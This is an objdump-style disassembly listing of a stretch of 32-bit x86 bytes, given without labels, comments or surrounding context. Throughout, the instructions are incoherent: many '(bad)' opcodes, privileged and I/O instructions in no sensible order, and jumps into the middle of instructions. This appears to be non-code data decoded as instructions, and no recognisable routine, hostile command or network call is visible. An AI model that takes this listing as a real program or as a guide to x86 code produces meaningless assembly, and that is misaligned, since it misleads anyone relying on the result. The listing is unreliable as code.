  429996:	push   es
  429997:	xchg   edx,eax
  429998:	xor    al,0x16
  42999a:	cmp    eax,0x92e230f8
  42999f:	xor    al,0x7c
  4299a1:	mov    ds:0xa90c3d3b,eax
  4299a6:	iret   
  4299a7:	jmp    0x72758962
  4299ac:	inc    ecx
  4299ad:	add    BYTE PTR [esi],dl
  4299af:	add    BYTE PTR [eax],al
  4299b1:	add    BYTE PTR [eax],al
  4299b3:	add    BYTE PTR [edi],ah
  4299b5:	(bad)  
  4299b6:	mov    ebp,0x86cd76e1
  4299bb:	xchg   ebp,eax
  4299bc:	and    BYTE PTR [ecx-0x428e0ebb],al
  4299c2:	sti    
  4299c3:	ins    BYTE PTR es:[edi],dx
  4299c4:	cmp    ch,BYTE PTR [ebx+0x2ba16a04]
  4299ca:	leave  
  4299cb:	stos   BYTE PTR es:[edi],al
  4299cc:	mov    edi,0xace23476
  4299d1:	aam    0xe7
  4299d3:	push   ecx
  4299d4:	pusha  
  4299d5:	add    al,BYTE PTR [eax]
  4299d7:	pop    esp
  4299d8:	lods   al,BYTE PTR ds:[esi]
  4299d9:	sti    
  4299da:	dec    edi
  4299db:	data16 cld 
  4299dd:	sub    ecx,DWORD PTR [edi-0x4a]
  4299e0:	addr16 or eax,0x27b6fa8c
  4299e6:	cs and bh,cl
  4299e9:	jp     0x429a37
  4299eb:	pop    es
  4299ec:	addr16 int3 
  4299ee:	jle    0x429a31
  4299f0:	inc    esi
  4299f1:	lods   eax,DWORD PTR ds:[esi]
  4299f2:	or     BYTE PTR [esi-0x241ff2b9],bl
  4299f8:	mov    dh,0x27
  4299fa:	enter  0x822a,0x3a
  4299fe:	bound  esi,QWORD PTR [eax+0x75]
  429a01:	ret    
  429a02:	enter  0x422a,0x80
  429a06:	pop    esp
  429a07:	lds    ebx,FWORD PTR [esi+0x7e]
  429a0a:	sti    
  429a0b:	xchg   BYTE PTR [ebp-0x59],ch
  429a0e:	(bad)  
  429a0f:	inc    BYTE PTR [ebx+0x68]
  429a12:	push   ebx
  429a13:	lahf   
  429a14:	outs   dx,BYTE PTR ds:[esi]
  429a15:	aam    0x10
  429a17:	jmp    0x429a1c
  429a1c:	add    BYTE PTR [esi+0x75],dh
  429a1f:	inc    esp
  429a20:	or     eax,0x364ed275
  429a25:	dec    edi
  429a26:	sub    al,0x15
  429a28:	popa   
  429a29:	add    edx,0xffffffff
  429a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a2d:	cmp    ch,cl
  429a2f:	cli    
  429a30:	add    BYTE PTR [eax+eax*4],cl
  429a33:	clc    
  429a34:	dec    DWORD PTR [ecx+0x25]
  429a37:	push   ecx
  429a38:	jmp    FWORD PTR [ecx]
  429a3a:	mov    edi,0x380c4009
  429a3f:	mov    edx,0xfb3308c6
  429a44:	pop    edx
  429a45:	pop    ds
  429a46:	dec    edx
  429a47:	sub    ah,0xad
  429a4a:	jg     0x429ab1
  429a4c:	cld    
  429a4d:	int3   
  429a4e:	dec    eax
  429a4f:	mov    WORD PTR [ebp-0x44],es
  429a52:	push   edx
  429a53:	div    BYTE PTR [ebp-0x20]
  429a56:	das    
  429a57:	mov    ebx,0xe7f2918d
  429a5c:	xchg   ecx,eax
  429a5d:	dec    edx
  429a5e:	hlt    
  429a5f:	test   BYTE PTR [ebx+0x79ee7a1c],0xa6
  429a66:	repz je 0x429a65
  429a69:	xor    al,0xd
  429a6b:	adc    BYTE PTR [eax],al
  429a6d:	mov    WORD PTR [edi],es
  429a6f:	or     BYTE PTR [ebx+0x4d82d6c9],cl
  429a75:	test   BYTE PTR [ebp+0x515a8b00],ah
  429a7b:	enter  0xe9c3,0xa7
  429a7f:	jmp    0x429ad2
  429a81:	add    BYTE PTR [eax],al
  429a83:	add    BYTE PTR [eax],al
  429a85:	add    BYTE PTR [edx-0x18a81059],bh
  429a8b:	xor    ecx,DWORD PTR [ebp+eax*2+0x75f65250]
  429a92:	push   esp
  429a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a94:	mov    edx,0x5209a28b
  429a99:	not    BYTE PTR [ebx-0xc]
  429a9c:	mov    BYTE PTR [ebp+0x40],al
  429a9f:	cmp    al,0xff
  429aa2:	leave  
  429aa3:	test   DWORD PTR [ebx+ebx*8-0x7bda67],0x36f629c9
  429aae:	jne    0x429af3
  429ab0:	push   edx
  429ab1:	or     esi,DWORD PTR [ebp+0x1b]
  429ab4:	fidivr WORD PTR [ecx]
  429ab6:	call   0x1b40a7aa
  429abb:	pop    ds
  429abc:	add    BYTE PTR [eax],al
  429abe:	jne    0x429a60
  429ac0:	ret    0xa2fb
  429ac3:	cmc    
  429ac4:	ss mov edi,0x511fb0a0
  429aca:	idiv   dh
  429acc:	das    
  429acd:	add    BYTE PTR [ebx-0x62],al
  429ad0:	ret    0x450f
  429ad3:	je     0x429a88
  429ad5:	or     ebp,eax
  429ad7:	(bad)  
  429ad8:	das    
  429ad9:	call   0xfb7348c3
  429ade:	(bad)  
  429adf:	stos   DWORD PTR es:[edi],eax
  429ae0:	xor    dl,0x3c
  429ae3:	and    DWORD PTR [eax],esi
  429ae5:	jne    0x429aa0
  429ae7:	ror    DWORD PTR [ecx+0xb],cl
  429aed:	add    BYTE PTR [eax],al
  429aef:	jne    0x429b0c
  429af1:	sbb    al,0x8
  429af3:	(bad)  
  429af4:	push   esi
  429af5:	sub    eax,DWORD PTR [edi+0x1762330]
  429afb:	out    dx,al
  429afc:	aad    0xcd
  429afe:	enter  0xe4b6,0xf5
  429b02:	out    0xf1,eax
  429b04:	sbb    al,0xff
  429b06:	dec    DWORD PTR [edi]
  429b08:	inc    edi
  429b09:	(bad)  
  429b0b:	add    al,0x2b
  429b0d:	(bad)  
  429b0e:	push   DWORD PTR [esi]
  429b10:	ins    BYTE PTR es:[edi],dx
  429b11:	jl     0x429b0b
  429b13:	test   BYTE PTR [ebx],0x31
  429b16:	jne    0x429b89
  429b18:	hlt    
  429b19:	mov    bh,0x23
  429b1b:	ins    DWORD PTR es:[edi],dx
  429b1c:	cld    
  429b1d:	adc    ah,al
  429b1f:	addr16 pop ebx
  429b21:	inc    DWORD PTR [esi+0x7a30964d]
  429b27:	lea    eax,[ecx+0x23a52ff]
  429b2d:	pop    ebp
  429b2e:	call   0x2f1235b5
  429b33:	jne    0x429b37
  429b35:	rol    DWORD PTR [ecx-0x17],0x24
  429b39:	retf   0x777a
  429b3c:	jg     0x429ae7
  429b3e:	mov    bh,0x65
  429b40:	shr    BYTE PTR [edi-0x4f],cl
  429b43:	jbe    0x429b6a
  429b45:	fadd   QWORD PTR [edi+0x73]
  429b48:	ret    0x7ae8
  429b4b:	mov    bh,0xfa
  429b4d:	pop    eax
  429b4e:	add    bl,dl
  429b50:	call   esi
  429b52:	inc    ebx
  429b53:	add    BYTE PTR [eax],al
  429b55:	add    BYTE PTR [eax],al
  429b57:	add    BYTE PTR [esi+0x40],cl
  429b5a:	in     eax,dx
  429b5b:	add    ebx,edx
  429b5d:	aad    0x2
  429b5f:	test   ebp,ebx
  429b61:	(bad)  
  429b63:	adc    dl,BYTE PTR [edi-0x7f]
  429b66:	sub    eax,0x850af946
  429b6c:	mov    ebp,0x5706f4c5
  429b71:	jg     0x429b9c
  429b73:	mov    dh,0x7d
  429b75:	cwde   
  429b76:	mov    esp,0xe77b14cb
  429b7b:	test   bl,ah
  429b7d:	inc    edx
  429b7f:	jl     0x429bf5
  429b81:	pushf  
  429b82:	outs   dx,DWORD PTR ds:[esi]
  429b83:	add    eax,0x84e74012
  429b88:	mov    ah,0xff
  429b8a:	loope  0x429c04
  429b8c:	je     0x429b2a
  429b8e:	arpl   WORD PTR [ebx+0x0],ax
  429b91:	ss (bad) 
  429b93:	inc    ebx
  429b94:	xlat   BYTE PTR ds:[ebx]
  429b95:	jns    0x429b7e
  429b97:	inc    esp
  429b98:	repnz mov dh,0xcc
  429b9b:	pop    es
  429b9c:	pop    edx
  429b9d:	clc    
  429b9e:	pop    esi
  429b9f:	add    bl,BYTE PTR [ecx-0x71058308]
  429ba5:	cmc    
  429ba6:	je     0x429bae
  429ba8:	mov    ah,0xe7
  429baa:	jmp    DWORD PTR [esi]
  429bac:	or     BYTE PTR [ebx],dh
  429bae:	xchg   DWORD PTR [eax],ebp
  429bb0:	sbb    eax,eax
  429bb2:	and    ebp,ebp
  429bb4:	pop    ds
  429bb5:	cmp    dh,BYTE PTR [ebp+esi*8-0xb]
  429bb9:	rol    DWORD PTR [eax],1
  429bbb:	adc    al,BYTE PTR [eax]
  429bbd:	add    BYTE PTR [eax],al
  429bbf:	add    BYTE PTR [eax],al
  429bc1:	retf   
  429bc2:	xchg   ebx,eax
  429bc3:	or     ebp,DWORD PTR [ecx+0x8]
  429bc6:	div    DWORD PTR [esi+ebp*8-0xa]
  429bca:	in     al,dx
  429bcb:	add    eax,0xc67b7734
  429bd0:	sub    BYTE PTR [eax+0x76e5bdf7],al
  429bd6:	int    0x86
  429bd8:	xchg   ebp,eax
  429bd9:	not    BYTE PTR [esi]
  429bdb:	xor    al,0x3a
  429bdd:	ret    
  429bde:	jl     0x429bd1
  429be0:	lahf   
  429be1:	mov    ebx,0x1d361007
  429be6:	mov    dh,0x65
  429be8:	leave  
  429be9:	test   al,0x76
  429beb:	inc    ebp
  429bec:	cdq    
  429bed:	mov    eax,ds:0x76e7e01b
  429bf2:	add    bh,BYTE PTR [edi+0x4]
  429bf5:	xchg   ebp,eax
  429bf6:	pop    ss
  429bf7:	das    
  429bf8:	inc    edx
  429bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429bfa:	sub    BYTE PTR [ecx],bh
  429bfc:	mov    edi,0x621db086
  429c01:	mov    ebx,0x1825fef7
  429c06:	mov    ebp,0xf3bb72db
  429c0b:	es es hlt 
  429c0e:	mov    ch,0xcf
  429c10:	pusha  
  429c11:	lods   al,BYTE PTR ds:[esi]
  429c12:	inc    ebx
  429c13:	call   0xfb69e687
  429c18:	ins    DWORD PTR es:[edi],dx
  429c19:	mov    ecx,0x5fa609ad
  429c1e:	test   eax,0x79b09b0f
  429c23:	pop    edx
  429c24:	cmc    
  429c25:	add    BYTE PTR [eax],al
  429c27:	add    BYTE PTR [eax],al
  429c29:	add    cl,bl
  429c2b:	enter  0x17,0x67
  429c2f:	cmp    eax,0xff644582
  429c34:	mov    esi,0x890bca89
  429c39:	inc    esi
  429c3a:	and    al,0xaf
  429c3c:	add    bl,ch
  429c3e:	nop
  429c3f:	das    
  429c40:	mov    ebx,0x3da64b33
  429c45:	adc    al,0x95
  429c47:	cmp    ch,bl
  429c49:	cmp    DWORD PTR [edx+0x26],edx
  429c4c:	push   es
  429c4d:	test   BYTE PTR [ecx],bh
  429c4f:	(bad)  
  429c50:	(bad)  
  429c51:	dec    DWORD PTR [edi]
  429c53:	out    0x40,al
  429c55:	mov    DWORD PTR [ecx-0x16],ebx
  429c58:	mov    BYTE PTR [ebp-0x3c],cl
  429c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c5c:	inc    ebp
  429c5d:	add    al,0x66
  429c5f:	repz pop es
  429c61:	cmp    ch,dl
  429c63:	imul   ecx,DWORD PTR [edx],0x70e8a3b
  429c69:	test   ecx,edi
  429c6b:	(bad)  
  429c6c:	(bad)  
  429c6d:	inc    DWORD PTR [ebp+0x55]
  429c70:	adc    esi,DWORD PTR [edx]
  429c72:	sbb    al,0x34
  429c74:	pop    ecx
  429c75:	pop    ebx
  429c76:	adc    eax,0xcd5e31c0
  429c7b:	and    edi,DWORD PTR [edi-0x1c]
  429c7e:	pushf  
  429c7f:	(bad)  
  429c80:	(bad)  
  429c81:	cmp    cl,dl
  429c83:	push   cs
  429c84:	je     0x429c6e
  429c86:	pop    ss
  429c87:	gs pop es
  429c89:	mov    ah,BYTE PTR [eax+0x4e8223]
  429c8f:	add    BYTE PTR [eax],al
  429c91:	add    BYTE PTR [eax],al
  429c93:	cwde   
  429c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c95:	push   esp
  429c96:	inc    DWORD PTR [edx-0x42]
  429c99:	or     esi,DWORD PTR [esi+ecx*8-0x14]
  429c9d:	ror    BYTE PTR [eax],0xc0
  429ca0:	adc    DWORD PTR [ebp-0x67a24b5],ecx
  429ca6:	sbb    DWORD PTR [ebx],eax
  429ca8:	add    eax,0x4b75c380
  429cad:	add    BYTE PTR [esi+0x1a],0xac
  429cb1:	sub    ebx,DWORD PTR [ecx]
  429cb3:	retf   0x7f2e
  429cb6:	mov    esi,0x87e7f495
  429cbb:	test   al,0x18
  429cbd:	sbb    DWORD PTR ds:0x503df16a,ebx
  429cc3:	xor    bl,BYTE PTR [edi]
  429cc5:	jmp    0x429cda
  429cc7:	mov    ch,0x2b
  429cc9:	jns    0x429ca3
  429ccb:	jb     0x429d46
  429ccd:	ret    
  429cce:	cli    
  429ccf:	lds    edx,FWORD PTR [eax+0x13]
  429cd2:	cmp    al,0x69
  429cd4:	jmp    0x429cd9
  429cd6:	mov    BYTE PTR [eax+0x5457960],dh
  429cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429cdd:	sar    dl,cl
  429cdf:	aas    
  429ce0:	jne    0x429c9a
  429ce2:	pop    ecx
  429ce3:	jmp    0x429cd6
  429ce5:	paddd  mm4,QWORD PTR [esi-0x6c]
  429ce9:	xor    edi,0x6f
  429cec:	(bad)  
  429ced:	out    0x7f,eax
  429cef:	fistp  QWORD PTR [esi]
  429cf1:	mov    dl,0x1a
  429cf3:	(bad)  
  429cf4:	(bad)  
  429cf5:	sub    esi,DWORD PTR [edi]
  429cf7:	add    BYTE PTR [eax],al
  429cf9:	add    BYTE PTR [eax],al
  429cfb:	add    BYTE PTR [ebx],bh
  429cfd:	cmp    edi,esp
  429cff:	jle    0x429d49
  429d01:	cwde   
  429d02:	sub    al,0xfb
  429d04:	out    dx,al
  429d05:	add    DWORD PTR [eax],eax
  429d07:	cmp    BYTE PTR [ecx-0x1e],dl
  429d0a:	dec    BYTE PTR [edx]
  429d0c:	lock xor ebp,DWORD PTR [ebx+edi*8]
  429d10:	mov    ds:0x9d452c70,al
  429d15:	(bad)  
  429d16:	fdivr  QWORD PTR [edi-0x71]
  429d19:	adc    eax,0xe02c84fc
  429d1e:	sub    al,0xfb
  429d20:	cmc    
  429d21:	aam    0xfa
  429d23:	or     dh,al
  429d25:	jnp    0x429d53
  429d27:	sti    
  429d28:	jb     0x429d2c
  429d2a:	outs   dx,BYTE PTR ds:[esi]
  429d2b:	mov    edi,0xfbaadd66
  429d30:	outs   dx,DWORD PTR ds:[esi]
  429d31:	test   DWORD PTR [ebp+0x5e215e2c],ebp
  429d37:	mov    esi,0x29cda76
  429d3c:	je     0x429d4f
  429d3e:	fs cmc 
  429d40:	aas    
  429d41:	and    edx,esi
  429d43:	ret    
  429d44:	aas    
  429d45:	(bad)  
  429d46:	hlt    
  429d47:	les    ebp,FWORD PTR [edi]
  429d49:	(bad)  
  429d4a:	loopne 0x429d0f
  429d4c:	das    
  429d4d:	(bad)  
  429d4e:	aam    0x7a
  429d50:	mov    eax,0x72c60e12
  429d55:	adc    DWORD PTR [edi+edi*8+0xf],esp
  429d59:	and    edx,eax
  429d5b:	lock retf 0x2317
  429d5f:	adc    BYTE PTR [eax],al
  429d61:	add    BYTE PTR [eax],al
  429d63:	add    BYTE PTR [eax],al
  429d65:	je     0x429cf2
  429d67:	xor    ecx,DWORD PTR [ecx+eax*4]
  429d6a:	xchg   esi,eax
  429d6b:	in     eax,dx
  429d6c:	lods   eax,DWORD PTR ds:[esi]
  429d6d:	adc    BYTE PTR [ecx],0x7d
  429d70:	inc    ebx
  429d71:	fmul   QWORD PTR [edi]
  429d73:	call   0xf0fc:0x338cde2c
  429d7a:	iret   
  429d7b:	out    0x78,eax
  429d7d:	daa    
  429d7e:	push   es
  429d7f:	sub    ecx,ebp
  429d81:	or     edx,DWORD PTR [ebp+0x46eebe1]
  429d87:	std    
  429d88:	xor    eax,0xfbf44582
  429d8d:	sti    
  429d8e:	xbegin 0x5a627eae
  429d94:	sub    al,0x1b
  429d96:	loop   0x429d52
  429d98:	jle    0x429dc2
  429d9a:	xor    bh,BYTE PTR [eax-0x16f0c3e5]
  429da0:	add    esi,DWORD PTR [edi+eax*8+0x14]
  429da4:	fidivr DWORD PTR [ecx]
  429da6:	cmp    al,BYTE PTR [eax]
  429da8:	pusha  
  429da9:	enter  0xe6f8,0x0
  429dad:	in     al,dx
  429dae:	les    ecx,FWORD PTR [ebx]
  429db0:	jmp    0xc4dd:0x3d4589b1
  429db7:	cmpps  xmm6,XMMWORD PTR [ecx-0x30c6b273],0xc5
  429dbf:	fist   WORD PTR [ecx]
  429dc1:	das    
  429dc2:	sbb    bh,bl
  429dc4:	dec    dl
  429dc6:	int    0xe7
  429dc8:	jmp    0x7900:0x0
  429dcf:	mov    DWORD PTR [edx-0x2f],ecx
  429dd2:	cli    
  429dd3:	inc    edx
  429dd4:	or     ebp,DWORD PTR [ecx+ebx*8+0x19]
  429dd8:	sti    
  429dd9:	fidiv  WORD PTR [esi]
  429ddb:	fnstcw WORD PTR [ecx-0x7]
  429dde:	loopne 0x429e2d
  429de0:	jmp    0xfb5dfd6f
  429de5:	sub    DWORD PTR [eax+0x7b],ebp
  429de8:	cli    
  429de9:	mov    esi,0xc586b54e
  429dee:	repnz es clc 
  429df1:	push   0xffffff8d
  429df3:	(bad)  
  429df4:	dec    esi
  429df5:	aas    
  429df6:	(bad)  
  429df7:	lock cli 
  429df9:	push   0xc
  429dfb:	hlt    
  429dfc:	add    BYTE PTR [eax+0xd],ah
  429dff:	in     al,0x17
  429e01:	fdivp  st(0),st
  429e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e04:	add    cl,ch
  429e06:	jbe    0x429d95
  429e08:	inc    esp
  429e09:	lds    ebp,FWORD PTR [esi-0x4e]
  429e0c:	out    0x29,eax
  429e0e:	int    0x19
  429e10:	sti    
  429e11:	cmp    DWORD PTR gs:[ebx],ecx
  429e14:	test   al,al
  429e16:	jno    0x429e1a
  429e18:	add    BYTE PTR [edx],bl
  429e1a:	cmp    edx,eax
  429e1c:	mov    BYTE PTR [ebp-0x5bc71c46],ch
  429e22:	or     BYTE PTR [ebx],0x82
  429e25:	add    BYTE PTR [eax+0x5],dh
  429e28:	add    BYTE PTR [eax],al
  429e2a:	pop    es
  429e2b:	or     esp,eax
  429e2d:	adc    cl,ah
  429e2f:	add    eax,DWORD PTR [ebx+0x4d]
  429e35:	add    BYTE PTR [eax],al
  429e37:	dec    esp
  429e38:	xor    al,0x65
  429e3a:	call   DWORD PTR [ebx-0x7ba87fee]
  429e40:	fdiv   DWORD PTR [eax-0x10607c01]
  429e46:	mov    eax,ebp
  429e48:	sbb    edi,DWORD PTR ds:[ebx]
  429e4b:	dec    ebx
  429e4c:	sbb    al,0x7f
  429e4e:	es dec ebp
  429e50:	add    eax,DWORD PTR [eax]
  429e52:	add    cl,0x17
  429e55:	sti    
  429e56:	jae    0x429eaa
  429e58:	xor    esi,esi
  429e5a:	jne    0x429e80
  429e5c:	sti    
  429e5d:	and    DWORD PTR [ecx+0x42],eax
  429e60:	in     al,dx
  429e61:	call   0x45ab50
  429e66:	mov    ebx,DWORD PTR [ecx+0x1e]
  429e69:	jecxz  0x429e75
  429e6b:	pop    ebp
  429e6c:	in     al,dx
  429e6d:	test   BYTE PTR [ecx-0x72e8dda8],0x48
  429e74:	and    cl,BYTE PTR [edi]
  429e76:	push   eax
  429e77:	push   ebp
  429e78:	addr16 pop ds
  429e7a:	sbb    BYTE PTR [esp+esi*4],al
  429e7d:	xor    bh,dh
  429e7f:	add    ebx,DWORD PTR [edi-0x53b7f041]
  429e85:	(bad)  
  429e86:	(bad)  
  429e87:	fcomp  QWORD PTR [ecx+0x32a42443]
  429e8d:	div    BYTE PTR [eax+edi*4+0x22]
  429e91:	jecxz  0x429eb1
  429e93:	add    ch,cl
  429e95:	test   BYTE PTR [ebx-0x76dcdd70],0x0
  429e9c:	add    BYTE PTR [eax],al
  429e9e:	add    BYTE PTR [eax],al
  429ea0:	loopne 0x429ee0
  429ea2:	das    
  429ea3:	push   ecx
  429ea4:	daa    
  429ea5:	fstp   TBYTE PTR [ebp-0xff28abc]
  429eab:	(bad)  
  429eac:	std    
  429ead:	fstp   TBYTE PTR fs:[ebx]
  429eb0:	cld    
  429eb1:	inc    esp
  429eb2:	fstp   TBYTE PTR [edi]
  429eb4:	lea    ecx,[ebx+edi*4+0x3eac7af9]
  429ebb:	or     edi,ecx
  429ebd:	test   al,0xfe
  429ebf:	push   DWORD PTR [ebp+0x5d]
  429ec2:	inc    ecx
  429ec3:	inc    esp
  429ec4:	cdq    
  429ec5:	sbb    bh,bh
  429ec7:	cli    
  429ec8:	inc    esi
  429ec9:	pop    ebp
  429eca:	js     0x429f18
  429ecc:	cdq    
  429ecd:	aaa    
  429ece:	jl     0x429f14
  429ed0:	xchg   ecx,eax
  429ed1:	pop    ebx
  429ed2:	jl     0x429f50
  429ed4:	cdq    
  429ed5:	aaa    
  429ed6:	pop    ss
  429ed7:	loope  0x429e8a
  429ed9:	adc    eax,0x51258729
  429ede:	cs je  0x429e77
  429ee1:	(bad)  [eax]
  429ee3:	iret   
  429ee4:	out    dx,al
  429ee5:	out    dx,eax
  429ee6:	fistp  WORD PTR [edi]
  429ee8:	(bad)
  429eeb:	je     0x429f46
  429eed:	div    esp
  429eef:	mov    edi,0xfa4b751d
  429ef4:	add    ch,BYTE PTR [eax+0x54597443]
  429efa:	mov    al,0x23
  429efc:	test   DWORD PTR [esi+0x73a123a7],edi
  429f02:	imul   eax,DWORD PTR [ebp+0x0],0x0
  429f09:	jecxz  0x429f87
  429f0b:	add    al,0x61
  429f0e:	and    ch,BYTE PTR [eax]
  429f10:	dec    esp
  429f11:	cdq    
  429f12:	sbb    eax,DWORD PTR [ecx+0x44]
  429f15:	xchg   ecx,eax
  429f16:	adc    al,0xfe
  429f18:	cs ret 0xbf9c
  429f1c:	and    esp,DWORD PTR [ebp-0x6c]
  429f1f:	scas   eax,DWORD PTR es:[edi]
  429f20:	and    eax,DWORD PTR [ebp+0x6123b7be]
  429f26:	add    dl,BYTE PTR [ecx-0x6e]
  429f29:	cmp    DWORD PTR [edx+ebx*2],ebx
  429f2c:	jge    0x429ed3
  429f2e:	fstp   DWORD PTR [ecx-0x51]
  429f31:	leave  
  429f32:	or     ch,0xdf
  429f35:	jg     0x429f39
  429f37:	mov    ebp,0x4967e12
  429f3c:	in     al,dx
  429f3d:	repz (bad) 
  429f3f:	or     al,0xec
  429f41:	outs   dx,DWORD PTR ds:[esi]
  429f42:	xchg   esi,eax
  429f43:	add    al,0xe4
  429f45:	push   edx
  429f46:	fsubrp st(4),st
  429f48:	sub    DWORD PTR [esi-0x71],ebx
  429f4b:	xchg   ebp,eax
  429f4c:	fisttp WORD PTR [edx+0x4cc5152a]
  429f52:	sbb    eax,0xf696b05c
  429f57:	adc    BYTE PTR [ecx],dh
  429f59:	mov    ebx,DWORD PTR [edx+edi*8]
  429f5c:	sub    cl,al
  429f5e:	out    0xc8,al
  429f60:	sbb    edx,DWORD PTR [ecx+ecx*1-0x3a0dfc17]
  429f67:	or     al,0xe0
  429f69:	bound  ecx,QWORD PTR [ebx+0xe025]
  429f6f:	add    BYTE PTR [eax],al
  429f71:	add    BYTE PTR [esi-0x27],dl
  429f74:	sub    edx,DWORD PTR [eax]
  429f76:	jle    0x429ef8
  429f78:	lahf   
  429f79:	sub    DWORD PTR [esi],ecx
  429f7b:	sbb    eax,0xfa56af74
  429f80:	rcl    BYTE PTR [ebx+eax*2+0x1c],1
  429f84:	mov    dl,0x73
  429f86:	je     0x429fb1
  429f88:	fidiv  WORD PTR [esi+0x61]
  429f8b:	out    0x0,al
  429f8d:	sbb    al,0xb7
  429f8f:	xlat   BYTE PTR ds:[ebx]
  429f90:	call   0x2bca:0x32428b28
  429f97:	mov    DWORD PTR [esi+eax*8-0x31170df8],eax
  429f9e:	sti    
  429f9f:	sub    eax,0x82bd1f66
  429fa4:	add    BYTE PTR [ebp-0x16fffdce],al
  429faa:	shl    DWORD PTR [edx-0x32cfe5ae],0x65
  429fb1:	pop    esi
  429fb2:	sbb    DWORD PTR [edx],edx
  429fb4:	sti    
  429fb5:	fist   WORD PTR [edx+0x662e7cb]
  429fbb:	sbb    ebx,edi
  429fbd:	call   0x897e:0xb7fb17e0
  429fc4:	inc    esp
  429fc5:	or     eax,0xb2e7cd4d
  429fca:	out    0x17,al
  429fcc:	sti    
  429fcd:	mov    edx,0x97fb1900
  429fd2:	bound  ecx,QWORD PTR [ebx+0xcd44]
  429fd8:	add    BYTE PTR [eax],al
  429fda:	add    BYTE PTR [edx-0x33],ah
  429fdd:	out    0x82,eax
  429fdf:	(bad)  
  429fe0:	pop    ss
  429fe1:	sti    
  429fe2:	jb     0x429f6a
  429fe4:	mov    DWORD PTR [ebp+eax*8+0x46],esi
  429fe8:	fistp  DWORD PTR [ebx-0x33]
  429feb:	push   ss
  429fec:	or     DWORD PTR [eax+ecx*4+0x20000277],eax
  429ff3:	sub    eax,0x9aee27e0
  429ff8:	scas   eax,DWORD PTR es:[edi]
  429ff9:	add    cl,ch
  429ffb:	jbe    0x429fd0
  429ffd:	out    dx,al
  429ffe:	fimul  WORD PTR [edx+0x76e900c7]
  42a004:	ficomp DWORD PTR [ecx+esi*8-0x36]
  42a008:	out    dx,eax
  42a009:	cli    
  42a00a:	cmp    eax,0x35fae3d5
  42a00f:	aad    0xdf
  42a011:	out    0x82,eax
  42a013:	in     al,dx
  42a014:	pop    ss
  42a015:	sti    
  42a016:	jae    0x42a041
  42a018:	sub    DWORD PTR [edx],esi
  42a01a:	call   0x25cfa295
  42a01f:	aad    0xdf
  42a021:	dec    edi
  42a022:	add    BYTE PTR [ebp+0x4a],al
  42a025:	pop    ds
  42a026:	xor    ah,ah
  42a028:	lea    edi,[edx]
  42a02a:	(bad)  
  42a02b:	sub    edx,DWORD PTR [edi+0x3b9889f7]
  42a031:	pop    ss
  42a032:	cmp    edx,DWORD PTR [edi]
  42a034:	adc    edi,DWORD PTR [edi+0x11]
  42a037:	(bad)  
  42a038:	(bad)  
  42a039:	(bad)  
  42a03a:	(bad)  
  42a03b:	mov    al,0x3b
  42a03d:	and    ecx,DWORD PTR [ebp+0x0]
  42a043:	add    al,bl
  42a045:	cmp    edx,DWORD PTR [ebx-0x1]
  42a048:	sar    BYTE PTR [ebx],0x1f
  42a04b:	call   0x3a11c6
  42a050:	xlat   BYTE PTR ds:[ebx]
  42a051:	push   edx
  42a052:	pop    ds
  42a053:	and    al,0xdf
  42a055:	bound  ebx,QWORD PTR [edi]
  42a057:	sbb    BYTE PTR [ebp+ebx*8+0x43],cl
  42a05b:	and    al,0x4b
  42a05d:	inc    DWORD PTR [esi+esi*8+0xd69b5b]
  42a064:	pop    esp
  42a065:	jmp    DWORD PTR [edx-0xa]
  42a068:	ss cwde 
  42a06a:	mov    esi,0xfa29048d
  42a06f:	neg    BYTE PTR [edi-0x1995fc3a]
  42a075:	popf   
  42a076:	dec    ebx
  42a077:	and    al,0x74
  42a079:	popf   
  42a07a:	inc    ebx
  42a07b:	and    al,0x20
  42a07d:	dec    eax
  42a07e:	popa   
  42a07f:	mov    esp,DWORD PTR [eax+0x1c00853b]
  42a085:	call   FWORD PTR [ebp-0x7b]
  42a088:	int3   
  42a089:	push   0x5
  42a08b:	data16 jne 0x42a0e9
  42a08e:	xor    DWORD PTR [edi],ecx
  42a090:	popa   
  42a091:	jg     0x42a093
  42a093:	add    ah,bl
  42a095:	jl     0x42a019
  42a097:	test   BYTE PTR [eax-0x3300006e],dh
  42a09d:	jl     0x42a023
  42a09f:	shl    BYTE PTR [ebp-0x3],0xf9
  42a0a3:	popa   
  42a0a4:	mov    esp,fs
  42a0a6:	jmp    0x42a11c
  42a0a8:	add    BYTE PTR [eax],al
  42a0aa:	add    BYTE PTR [eax],al
  42a0ac:	add    BYTE PTR [eax-0x6a],dl
  42a0af:	mov    edx,0x99f91d23
  42a0b4:	ret    0x4d39
  42a0b7:	out    0x3a,eax
  42a0b9:	pop    edi
  42a0ba:	mov    ds:0xa46123ba,al
  42a0bf:	pinsrw mm0,WORD PTR [edi+0x3988ff69],0xd
  42a0c7:	call   0x1447d252
  42a0cc:	push   eax
  42a0cd:	in     al,dx
  42a0ce:	ins    BYTE PTR es:[edi],dx
  42a0cf:	fild   DWORD PTR [ebx+0x7a]
  42a0d2:	xor    eax,0x2bb50e3b
  42a0d7:	js     0x42a125
  42a0d9:	xchg   ecx,eax
  42a0da:	(bad)  
  42a0dc:	inc    esp
  42a0dd:	cdq    
  42a0de:	cmp    al,BYTE PTR [si-0x6f]
  42a0e2:	pop    ebx
  42a0e3:	cli    
  42a0e4:	call   DWORD PTR [edx+0x2c]
  42a0e7:	pop    ss
  42a0e8:	xor    BYTE PTR [esi+0x9],cl
  42a0eb:	and    al,BYTE PTR [ebp+esi*1-0x46c92a68]
  42a0f2:	aas    
  42a0f3:	add    ebp,DWORD PTR [esi-0x7f]
  42a0f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a0f7:	mov    dl,0x23
  42a0f9:	xor    DWORD PTR [eax+0x76],0xf9000dc2
  42a100:	call   FWORD PTR [edx]
  42a102:	cmp    DWORD PTR [eax-0x37fda6dd],edi
  42a108:	and    esp,DWORD PTR [ebp+0x4]
  42a10b:	xor    ebx,edi
  42a10d:	mov    cl,0x7
  42a10f:	or     al,0x27
  42a111:	add    BYTE PTR [eax],al
  42a113:	add    BYTE PTR [eax],al
  42a115:	add    dh,bh
  42a117:	repnz (bad) 
